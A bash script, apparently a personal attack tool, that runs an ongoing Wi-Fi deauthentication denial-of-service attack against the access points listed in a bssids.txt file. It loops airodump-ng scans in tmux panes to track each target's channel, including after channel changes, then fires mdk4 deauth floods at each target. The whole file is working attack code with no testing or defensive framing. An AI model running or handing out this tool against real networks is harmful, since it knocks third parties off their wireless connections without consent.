#!/bin/bash

scriptname="dos1.sh"
session_name="tmux_test"
tmux_main_window="test-Main"
scriptfolder="./"

# Use default values if no arguments are passed
if=${1:-"wlan0"}
log_file="dos_pursuit.log"
channel_file="channel.txt"
old_channel_file="old_channel.txt"

#Check if script is currently executed inside tmux session or not
function check_inside_tmux() {

  local parent_pid
  local parent_window
  parent_pid=$(ps -o ppid= ${PPID} 2>/dev/null | tr -d ' ')
  parent_window="$(ps --no-headers -p "${parent_pid}" -o comm= 2>/dev/null)"
  if [[ "${parent_window}" =~ tmux ]]; then
    return 0
  fi
  return 1
}
function check_superuser() {
  # Check for superuser privileges
  if [ "$(id -u)" != "0" ]; then
    echo "This script must be run as root" 1>&2
    exit 1
  fi
}

#Close any existing tmux session before opening, to avoid conflicts
#shellcheck disable=SC2009
function close_existing_airgeddon_tmux_session() {

  if ! check_inside_tmux; then
    eval "kill -9 $(ps --no-headers aux | grep -i 'tmux.*airgeddon' | awk '{print $2}' | tr '\n' ' ') > /dev/null 2>&1"
  fi
}

#Hand over script execution to tmux and call function to create a new session
function transfer_to_tmux() {

  close_existing_airgeddon_tmux_session

  if ! check_inside_tmux; then
    create_tmux_session "${session_name}" "true"
  else
    local active_session
    active_session=$(tmux display-message -p '#S')
    if [ "${active_session}" != "${session_name}" ]; then
      tmux_error=1
    fi
  fi
}

#Starting point of airgeddon script inside newly created tmux session
function start_airgeddon_from_tmux() {

  tmux rename-window -t "${session_name}" "${tmux_main_window}"
  tmux send-keys -t "${session_name}:${tmux_main_window}" "clear;cd ${scriptfolder};bash ${scriptname} ${if}" ENTER
  sleep 0.2
  if [ "${1}" = "normal" ]; then
    tmux attach -t "${session_name}"
  else
    tmux switch-client -t "${session_name}"
  fi
}

#Create new tmux session exclusively for airgeddon
function create_tmux_session() {
  session_name="${1}"

  tmux new-session -d -s "${1}"
  start_airgeddon_from_tmux "normal"
  exit 0
}

function create_panes() {
  # Create a tmux session with two panes
  tmux split-window -v -t ${session_name}:0.0
  tmux split-window -h -t ${session_name}:0.0
}

#Set the script folder var if necessary
function set_script_paths() {

  if [ -z "${scriptfolder}" ]; then
    scriptfolder=${0}

    if ! [[ ${0} =~ ^/.*$ ]]; then
      if ! [[ ${0} =~ ^.*/.*$ ]]; then
        scriptfolder="./"
      fi
    fi
    scriptfolder="${scriptfolder%/*}/"
    scriptfolder="$(readlink -f "${scriptfolder}")"
    scriptfolder="${scriptfolder%/}/"
    scriptname="${0##*/}"
  fi
}

function stop_monitor_mode() {
  # Check to see if all interfaces are in monitor mode, else put them in monitor mode
  if iwconfig "$if" | grep -q "Mode:Monitor"; then
    echo "Putting all interfaces in managed mode"
    airmon-ng stop "$if"
  else
    echo "All interfaces are in managed mode"
  fi
}

function stop_5_deauth() {
  tmux select-pane -t ${session_name}:0.1
  tmux send-keys -t ${session_name}:0.1 C-c
}

function run_airodump() {

  echo "$(date "+%F %T")| Scanning for channel change" >>"$log_file"
  # Remove the old files
  rm -f "dos_pm-01.csv"
  # Run airodump-ng in the tmux pane 1 for 30 seconds
  airodump_command="airodump-ng -w ./dos_pm $if -c 1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52 --output-format csv"
  tmux send-keys -t ${session_name}:0.2 "$airodump_command" Enter
  sleep 15
  # Kill airodump-ng
  tmux send-keys -t ${session_name}:0.2 C-c
}

function process_capture() {
  rm -rf "${channel_file}" >/dev/null 2>&1

  # Extract the channel of bssids contained in bssids.txt from the capture file in the form <bssid> <channel>
  for bssid in $(cat "bssids.txt"); do
    grep "$bssid" dos_pm-01.csv | head -n 1 | cut -d ',' -f1,4 | tr -d ' ' | tr ',' ' ' >>$channel_file
  done

}

function mdk4_deauth() {
  # Usage: mdk4_deauth <if> <BSSID> <channel> <tmux pane>
  mdk_command="mdk4 $1 d -B $2 -c $3"
  tmux send-keys -t "${session_name}:0.$4" "$mdk_command" Enter
}

function has_changed() {
  # Usage: compare_channel <BSSID>
  # Checks to see if channel in channel.txt matches the current channel in old_channel.txt
  # If it does, then it returns 0, else it returns 1
  if [ -f "$old_channel_file" ]; then
    old_channel=$(grep "$1" "$old_channel_file" | cut -d ' ' -f2)
    current_channel=$(grep "$1" "$channel_file" | cut -d ' ' -f2)
    [ "$old_channel" == "$current_channel" ] && return 0 || return 1
  else
    return 1
  fi
}

function run_deauth_on_channel() {
  # Usage: run_deauth_on_channel <BSSID> <channel>
  if [ "$2" -gt 13 ]; then
    echo "$(date "+%F %T")| Starting 5GHz deauth on $1 @ $2" >>"$log_file"
    tmux send-keys -t ${session_name}:0.1 C-c
    mdk4_deauth "$if" "$1" "$2" 1
  else
    echo "$(date "+%F %T")| Starting 2GHz deauth on $1 @ $2" >>"$log_file"
    tmux send-keys -t ${session_name}:0.1 C-c
    mdk4_deauth "$if" "$1" "$2" 1
  fi
}

function check_restarts() {
  while read -r line; do
    bssid=$(echo "$line" | cut -d ' ' -f1)
    channel=$(echo "$line" | cut -d ' ' -f2)

    run_deauth_on_channel "$bssid" "$channel"
    sleep 60
  done <"$channel_file"
}

check_superuser
set_script_paths
transfer_to_tmux
create_panes

# List interfaces
echo "Interfaces:"
echo "5GHz: $if"
echo "2GHz: $if"

rm -rf "$log_file" "$old_channel_file" >/dev/null 2>&1

# Log in pane 1
echo "$(date "+%F %T")| Starting DOS pursuit attack" >>"$log_file"
# tmux send-keys -t ${session_name}:0.0 "tail -f $log_file" ENTER
tmux select-pane -t ${session_name}:0.0
tail -f "$log_file" &

# Periodically run airodump-ng in the first tmux pane
while true; do
  run_airodump
  sleep 1
  process_capture
  sleep 1
  # Loop 3 times
  for i in {1..3}; do
    check_restarts
  done
  

  cp "$channel_file" "$old_channel_file"
done
